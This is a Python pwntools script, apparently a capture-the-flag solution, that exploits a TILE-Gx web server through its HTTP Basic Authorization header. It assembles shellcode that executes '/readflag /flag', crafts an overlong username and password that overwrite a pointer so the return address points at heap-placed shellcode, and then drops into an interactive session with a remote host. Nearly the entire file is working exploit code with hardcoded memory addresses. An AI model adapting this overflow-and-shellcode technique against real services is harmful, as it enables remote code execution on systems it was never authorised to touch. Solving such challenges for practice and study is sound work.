#!/usr/bin/env python3
import struct
import subprocess

from pwn import *

BASEDIR = os.path.dirname(__file__)


def connect():
    if args.LOCAL:
        return remote("172.17.0.3", 9999)
    else:
        return remote("111.186.59.27", 28088)


def main():
    with open("shellcode.s", "w") as fp:
        fp.write(
            """
lnk r13
base:
addi sp, sp, -64
moveli r10, 221                          /* TARGET_NR_execve */
addi r0, r13, (readflag - base)          /* pathname */
move r1, sp                              /* argv */
st r1, r0                                /* argv[0] = pathname */
addi r2, sp, 8
addi r3, r13, (flag - base)
st r2, r3                                /* argv[1] = arg */
addi r2, sp, 16                          /* envp = &argv[2]; */
st r2, zero                              /* argv[2] = 0; */
swint1
readflag: .asciz "/readflag"
flag: .asciz "/flag"
"""
        )
    subprocess.check_call(
        [
            os.path.expanduser("~/binutils-tilegx/bin/tilegx-linux-gnu-as"),
            "-c",
            "shellcode.s",
            "-o", "shellcode.o",
        ]
    )
    subprocess.check_call(
        [
            os.path.expanduser("~/binutils-tilegx/bin/tilegx-linux-gnu-objcopy"),
            "-O",
            "binary",
            "--only-section=.text",
            "shellcode.o",
            "shellcode.bin",
        ]
    )
    with open("shellcode.bin", "rb") as fp:
        shellcode = fp.read() + b"\x00"
    with connect() as tube:
        tube.send("GET / HTTP/1.1\r\n")
        # username = "admin"
        # password = "70p_s3cr37_!@#"
        username_buf_addr = 0x400080FA80
        # username_buf_addr_addr = 0x400080fac8
        password_buf_addr = 0x400080FA50
        password_buf_addr_addr = 0x400080FAC0
        retaddr_addr = 0x400080FB10
        orig_val = struct.pack("<Q", password_buf_addr)
        new_val = struct.pack("<Q", retaddr_addr)
        suffix_len = 5
        assert orig_val[-suffix_len:] == new_val[-suffix_len:]
        username = flat(
            {
                password_buf_addr_addr - username_buf_addr: new_val[:-suffix_len],
            }
        )
        print(str(len(username)))
        print(username)
        assert b"\x00" not in username
        assert b":" not in username
        # r0 @ 0x1003188
        password_heap_addr = 0x1020860 + len(username) + 1
        print(hex(password_heap_addr))
        # can be less than +64, but who cares
        shellcode_heap_addr = password_heap_addr + 64
        shellcode_heap_addr = (shellcode_heap_addr + 7) & ~7
        print(hex(shellcode_heap_addr))
        password = flat(
            {
                0: struct.pack("<Q", shellcode_heap_addr),
                shellcode_heap_addr - password_heap_addr: shellcode,
            }
        )
        print(str(len(password)))
        print(password)
        auth = base64.b64encode(username + b":" + password).decode()
        tube.send(f"Authorization: Basic {auth}\r\n")
        tube.send("\r\n")
        tube.interactive()


if __name__ == "__main__":
    main()
